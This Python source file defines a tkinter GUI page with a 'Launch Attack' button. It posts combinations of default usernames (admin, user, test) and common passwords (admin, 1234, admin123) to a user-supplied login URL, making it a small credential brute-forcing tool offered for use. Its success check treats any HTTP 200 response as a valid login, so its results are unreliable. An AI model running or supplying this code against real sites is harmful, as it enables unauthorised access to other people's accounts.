import requests
from tkinter import Frame, Label, Entry, Button, Text, Scrollbar, StringVar

class TestPage(Frame):
    def __init__(self, parent, controller):
        Frame.__init__(self, parent)
        self.controller = controller

        Label(self, text="Login URL:").pack()
        self.url_entry = Entry(self)
        self.url_entry.pack()

        Label(self, text="Username:").pack()
        self.username_entry = Entry(self)
        self.username_entry.pack()

        Label(self, text="Email field name:").pack()
        self.email_field_entry = Entry(self)
        self.email_field_entry.pack()

        Label(self, text="Password field name:").pack()
        self.password_field_entry = Entry(self)
        self.password_field_entry.pack()

        self.result_text = Text(self)
        self.result_text.pack()

        Button(self, text="Launch Attack", command=self.launch_attack).pack()

    def launch_attack(self):
        url = self.url_entry.get()
        username = self.username_entry.get()
        email_field = self.email_field_entry.get()
        password_field = self.password_field_entry.get()

        # List of common passwords to test
        passwords = ["password", "1234", "admin", "admin123"]

        # List of common usernames to test if no username is provided
        usernames = ["admin", "user", "test", "username"] if not username else [username]

        # Clear the result text
        self.result_text.delete('1.0', 'end')

        success_count = 0
        fail_count = 0

        for username in usernames:
            for password in passwords:
                data = {
                    email_field: username,
                    password_field: password
                }
                response = requests.post(url, data=data)
                if response.status_code == 200:
                    self.result_text.insert('end', f"Success with username: {username}, password: {password}\n")
                    success_count += 1
                else:
                    self.result_text.insert('end', f"Failed with username: {username}, password: {password}\n")
                    fail_count += 1

        # Display the summary
        self.result_text.insert('end', f"\nSummary:\nSuccesses: {success_count}\nFailures: {fail_count}\n")